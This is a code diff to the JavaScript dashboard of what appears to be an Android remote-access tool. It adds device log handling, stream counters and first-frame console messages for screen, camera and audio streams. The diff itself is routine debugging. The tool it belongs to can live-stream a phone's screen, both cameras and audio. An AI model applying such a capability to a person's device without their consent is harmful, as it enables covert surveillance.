@@ -772,16 +772,32 @@ function handleJsonMessage(data) {
         case 'ERROR':
             logToConsole(`Erro: ${data.message}`, 'error');
             break;
-            
+
+        // Diagnostic messages the Android device sends via sendConsoleLog.
+        // Previously fell through to the "unhandled" default and got silently
+        // dropped — that's why users saw no feedback when a command failed.
+        case 'LOG':
+            logToConsole(`[${data.deviceId || 'device'}] ${data.message}`, 'device');
+            break;
+
         default:
             console.log('Unhandled JSON event:', data);
     }
 }
 
+// Diagnostic counters — help distinguish "frames not arriving" from "frames
+// arriving but state mismatch" when a stream visually appears stuck.
+const __streamStats = { totalBinary: 0, screenBytes: 0, screenCount: 0, cameraBytes: 0, cameraCount: 0, audioCount: 0 };
+window.__streamStats = __streamStats; // expose for DevTools inspection
+
 // Route binary frames by first byte (type byte)
 // 0x01 = screen JPEG | 0x02 = front cam JPEG | 0x03 = back cam JPEG | 0x04 = audio PCM
 // legacy (no prefix, raw JPEG) = screen
 function handleBinaryFrame(arrayBuffer) {
+    __streamStats.totalBinary += 1;
+    if (__streamStats.totalBinary === 1) {
+        logToConsole(`WS binário: primeiro frame chegou do servidor (${arrayBuffer.byteLength} bytes)`, 'success');
+    }
     const view = new Uint8Array(arrayBuffer);
     const type = view[0];
 
@@ -803,6 +819,13 @@ function handleBinaryFrame(arrayBuffer) {
 
 // Handle Screen JPEG frames
 function handleScreenFrame(arrayBuffer) {
+    // Diagnostic: count every arriving frame regardless of state so we can
+    // see "frames are arriving but the state says off" vs "no frames at all"
+    __streamStats.screenBytes += arrayBuffer.byteLength;
+    __streamStats.screenCount += 1;
+    if (__streamStats.screenCount === 1) {
+        logToConsole(`Primeiro frame de tela recebido (${arrayBuffer.byteLength} bytes) — isScreenStreaming=${isScreenStreaming}`, 'success');
+    }
     if (!isScreenStreaming || !currentDeviceId) return;
 
     const blob = new Blob([arrayBuffer], { type: 'image/jpeg' });
@@ -822,6 +845,11 @@ function handleScreenFrame(arrayBuffer) {
 
 // Handle live camera JPEG frames
 function handleCameraFrame(arrayBuffer, camType) {
+    __streamStats.cameraBytes += arrayBuffer.byteLength;
+    __streamStats.cameraCount += 1;
+    if (__streamStats.cameraCount === 1) {
+        logToConsole(`Primeiro frame de câmera (${camType}) recebido (${arrayBuffer.byteLength} bytes) — isCameraStreaming=${isCameraStreaming} active=${activeCameraType}`, 'success');
+    }
     if (!isCameraStreaming || activeCameraType !== camType) return;
 
     const blob = new Blob([arrayBuffer], { type: 'image/jpeg' });
